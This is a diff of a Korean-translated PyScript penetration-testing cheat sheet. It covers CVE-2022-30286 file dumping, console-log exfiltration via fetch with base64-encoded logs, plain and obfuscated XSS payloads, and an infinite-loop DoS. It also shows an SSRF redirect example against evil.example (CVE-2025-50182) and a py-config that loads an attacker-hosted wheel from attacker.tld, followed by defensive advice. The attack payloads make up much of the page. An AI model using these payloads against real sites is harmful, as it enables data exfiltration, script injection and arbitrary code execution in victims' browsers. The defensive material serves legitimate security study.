@@ -1,14 +1,12 @@
 # Pyscript
 
-{{#include ../../banners/hacktricks-training.md}}
-
 ## PyScript Pentesting 가이드
 
 PyScript는 Python을 HTML에 통합하여 HTML과 함께 사용할 수 있도록 개발된 새로운 framework입니다. 이 cheat sheet에서는 penetration testing 목적으로 PyScript를 사용하는 방법을 확인할 수 있습니다.
 
-### Emscripten 가상 메모리 파일 시스템에서 파일 Dumping / Retrieving:
+### Emscripten virtual memory filesystem에서 파일 Dumping / Retrieving:
 
-`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
+`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
 \
 코드:
 ```html
@@ -19,13 +17,13 @@ with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
 ```
 결과:
 
-![PyScript Pentesting Guide - Emscripten virtual memory filesystem에서 파일 Dumping / Retrieving: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
+![PyScript Pentesting Guide - Emscripten 가상 메모리 파일 시스템에서 Dumping / Retrieving: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
 
-### [OOB Data Exfiltration of the Emscripten virtual memory filesystem (console 모니터링)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
+### [Emscripten 가상 메모리 파일 시스템의 OOB Data Exfiltration (콘솔 모니터링)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPkP5/blogs/the-art-of-vulnerability-chaining-pyscript)
 
-`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
+`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
 \
-Code:
+코드:
 ```html
 <py-script>
 x = "CyberGuy" if x == "CyberGuy": with
@@ -49,7 +47,7 @@ body: JSON.stringify({ content: btoa(console.logs) }),
 ```
 결과:
 
-![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)
+![Emscripten virtual memory filesystem에서 파일 Dumping / Retrieving - Emscripten virtual memory filesystem의 OOB Data Exfiltration (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)
 
 ### Cross Site Scripting (Ordinary)
 
@@ -59,9 +57,9 @@ Code:
 print("<img src=x onerror='alert(document.domain)'>")
 </py-script>
 ```
-결과:
+Result:
 
-![OOB Data Exfiltration of the Emscripten virtual memory filesystem (콘솔 모니터링) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
+![Emscripten 가상 메모리 파일 시스템의 OOB Data Exfiltration (콘솔 모니터링) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
 
 ### Cross Site Scripting (Python Obfuscated)
 
@@ -77,7 +75,7 @@ y = "o";m = "ner";z = "ror\u003d"
 print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
 </py-script>
 ```
-결과:
+Result:
 
 ![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)
 
@@ -151,13 +149,13 @@ return _0x599c()
 "")
 </py-script>
 ```
-Result:
+결과:
 
-![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Infinity loop)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
+![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS 공격 (무한 루프)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
 
-### DoS attack (Infinity loop)
+### DoS 공격 (무한 루프)
 
-Code:
+코드:
 ```html
 <py-script>
 while True:
@@ -170,38 +168,43 @@ print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
 
 ---
 
-## 새로운 취약점 및 기법 (2023-2025)
+## 새로운 취약점 및 techniques (2023-2025)
 
-### 제어되지 않은 redirect를 통한 Server-Side Request Forgery (CVE-2025-50182)
+### Server-Side Request Forgery via 제어되지 않는 리디렉션 (CVE-2025-50182)
 
-`urllib3 < 2.5.0`은 PyScript와 함께 제공되는 **Pyodide runtime 내부에서** 실행될 때 `redirect` 및 `retries` 매개변수를 무시합니다. 공격자가 대상 URL에 영향을 줄 수 있는 경우, 개발자가 redirect를 명시적으로 비활성화했더라도 Python 코드가 cross-domain redirect를 따르도록 강제할 수 있으며, 결과적으로 anti-SSRF 로직을 우회할 수 있습니다.<sup>[[1]](#references)</sup>
+`urllib3 >= 2.2.0, < 2.5.0`은 Pyodide의 browser transport와 함께 사용될 때 `redirect` 및 `retries` request parameters를 무시합니다. 공격자가 target URLs에 영향을 줄 수 있다면, 코드에서 urllib3에 해당 리디렉션을 비활성화하도록 요청한 경우에도 cross-domain redirects를 따를 수 있어 SSRF 방어가 약화됩니다.<sup>[[1]](#references)[[4]](#references)</sup>
 ```html
 <script type="py">
 import urllib3
-http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
-r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
+http = urllib3.PoolManager()
+r = http.request(
+"GET",
+"https://evil.example/302",
+retries=False,
+redirect=False,
+)  # ignored by affected Pyodide/browser runtimes
 print(r.status, r.url)
 </script>
 ```
-`urllib3 2.5.0`에서 패치됨 – PyScript image의 package를 업그레이드하거나 `packages = ["urllib3>=2.5.0"]`로 안전한 버전을 고정하세요. 자세한 내용은 공식 CVE 항목을 참조하세요.
+Node.js의 경우 `urllib3 >= 2.5.0`으로 업그레이드하되, 브라우저에서 redirect를 비활성화하기 위해 urllib3에 의존하지 말고 요청을 보내기 전에 destination을 검증하거나 allow-list를 적용하세요.<sup>[[4]](#references)</sup>
 
-### 임의 package 로딩 및 supply-chain 공격
+### 임의 패키지 로딩 및 supply-chain attacks
 
-PyScript는 `packages` 목록에서 임의의 URL을 허용하므로, 설정을 수정하거나 주입할 수 있는 악의적인 공격자는 피해자의 브라우저에서 **완전히 임의의 Python**을 실행할 수 있습니다:
+PyScript의 Pyodide 구성은 `packages`에서 임의의 wheel URL을 허용합니다. 공격자가 해당 구성을 수정하거나 주입할 수 있다면, 이후 import를 통해 피해자의 브라우저에서 공격자가 제어하는 Python이 실행될 수 있습니다.<sup>[[5]](#references)[[6]](#references)</sup>
 ```html
 <py-config>
 packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
 </py-config>
 <script type="py">
-import payload  # executes attacker-controlled code during installation
+import payload  # executes attacker-controlled code at import
 </script>
 ```
-*순수 Python wheels만 필요하며 WebAssembly compilation 단계는 필요하지 않습니다.* configuration이 user-controlled가 되지 않도록 하고, HTTPS 및 SRI hashes를 사용하여 trusted wheels를 자체 domain에서 호스팅하세요.
+Pyodide는 패키지를 WebAssembly로 빌드하지 않고도 임의의 URL에서 pure-Python wheel을 설치할 수 있습니다.<sup>[[6]](#references)</sup> 이 configuration은 developer가 제어하도록 유지하고, 정확한 package name 또는 URL을 allow-list에 등록하며, build 또는 deployment 중 원격 wheel의 digest를 검증하세요.
 
 ### Output sanitisation changes (2023+)
 
-* `print()`는 여전히 raw HTML을 inject하므로 XSS에 취약합니다(위 예시 참조).
-* 새로운 `display()` helper는 **기본적으로 HTML을 escape**합니다. raw markup은 `pyscript.HTML()`로 감싸야 합니다.
+* legacy examples에서 사용되는 2022.05.1 implementation에서는 `print()`가 HTML escaping 없이 `text/plain` output을 작성하므로 XSS에 취약합니다.<sup>[[8]](#references)</sup>
+* 현재 `display()` helper는 plain string에 대해 기본적으로 HTML을 **escape**합니다. raw markup은 `pyscript.HTML()`로 감싸야 합니다.<sup>[[2]](#references)</sup>
 ```python
 from pyscript import display, HTML
 
@@ -209,22 +212,26 @@ display("<b>escaped</b>")          # renders literally
 
 display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
 ```
-이 동작은 2023년에 도입되었으며 공식 Built-ins 가이드에 문서화되어 있습니다. 신뢰할 수 없는 입력에는 `display()`를 사용하고 `print()`를 직접 호출하지 마세요.<sup>[[2]](#references)</sup>
+신뢰할 수 없는 입력에는 `display()`를 사용하고, 신뢰할 수 없는 문자열을 `HTML()`에 전달하지 마세요.<sup>[[2]](#references)</sup>
 
 ---
 
-## 방어 모범 사례
+## Defensive Best Practices
 
-* **패키지를 최신 상태로 유지** – `urllib3 >= 2.5.0`으로 업그레이드하고 사이트와 함께 제공되는 wheel을 정기적으로 다시 빌드하세요.
-* **패키지 소스를 제한** – PyPI 이름 또는 동일 출처 URL만 참조하고, 가능한 경우 Sub-resource Integrity (SRI)로 보호하세요.
+* **패키지를 최신 상태로 유지** – Node.js에서 `urllib3 >= 2.5.0`을 사용하고 브라우저 리디렉션 가정을 별도로 검토하세요.<sup>[[4]](#references)</sup>
+* **패키지 소스를 제한** – PyPI 이름 또는 정확히 신뢰할 수 있는 URL을 allow-list에 추가하고, 빌드 또는 배포 중 원격 wheel digest를 검증하세요.<sup>[[5]](#references)[[6]](#references)</sup>
 * **Content Security Policy 강화** – 인라인 JavaScript (`script-src 'self' 'sha256-…'`)를 허용하지 않아 삽입된 `<script>` 블록이 실행되지 않도록 하세요.
-* **사용자가 제공한 `<py-script>` / `<script type="py">` 태그 금지** – 다른 사용자에게 다시 반환하기 전에 서버에서 HTML을 sanitise하세요.
-* **worker 격리** – worker에서 DOM에 동기적으로 접근할 필요가 없다면 `sync_main_only` flag를 활성화하여 `SharedArrayBuffer` header 요구 사항을 피하세요.
+* **사용자가 제공한 `<py-script>` / `<script type="py">` 태그를 허용하지 않기** – 다른 사용자에게 다시 출력하기 전에 서버에서 HTML을 sanitise하세요.
+* **worker 격리** – worker에서 DOM에 동기식으로 액세스할 필요가 없다면 `sync_main_only` 플래그를 활성화하여 `SharedArrayBuffer` 및 관련 CORS header 요구 사항을 방지하세요.<sup>[[5]](#references)</sup>
 
 ## References
 
 - [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
-- [2] [PyScript Built-ins documentation – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
-- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
-
+- [2] [PyScript Built-ins 문서 – `display` 및 `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
+- [3] [Cyber Guy - Vulnerability Chaining의 기술 (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
+- [4] [urllib3 보안 권고 – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
+- [5] [PyScript 설정 문서 – packages 및 `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
+- [6] [Pyodide – 패키지 로드](https://pyodide.org/en/stable/usage/loading-packages.html)
+- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
+- [8] [PyScript 2022.05.1 `pyscript.py` 구현](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
 {{#include ../../banners/hacktricks-training.md}}
